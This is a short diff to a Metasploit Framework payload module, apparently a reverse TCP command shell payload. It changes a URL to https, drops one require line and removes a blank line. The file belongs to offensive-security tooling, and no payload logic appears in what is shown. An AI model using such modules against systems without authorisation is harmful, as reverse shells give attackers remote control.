@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/generic'
 require 'msf/core/handler/reverse_tcp'
 
@@ -24,5 +23,4 @@ module MetasploitModule
       'Session'       => Msf::Sessions::CommandShell
       ))
   end
-
 end
